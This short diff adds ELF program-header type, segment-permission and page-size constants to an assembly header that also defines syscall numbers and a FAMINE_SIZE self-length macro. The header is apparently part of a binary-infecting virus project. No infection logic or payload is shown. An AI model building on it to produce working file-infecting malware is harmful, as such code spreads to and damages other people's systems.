@@ -9,7 +9,14 @@
 %define O_RDONLY		0
 %define SYS_openat		257
 %define AT_FDCWD  -100
-
+%define PT_NULL         0
+%define PT_LOAD         1
+%define PT_NOTE         4
+%define PT_SHLIB        5
+%define PF_X            1
+%define PF_W            2
+%define PF_R            4
+%define PAGE_SIZE       0x1000
 %define FAMINE_SIZE end_addr - _start
 
 ; STRUCTURES
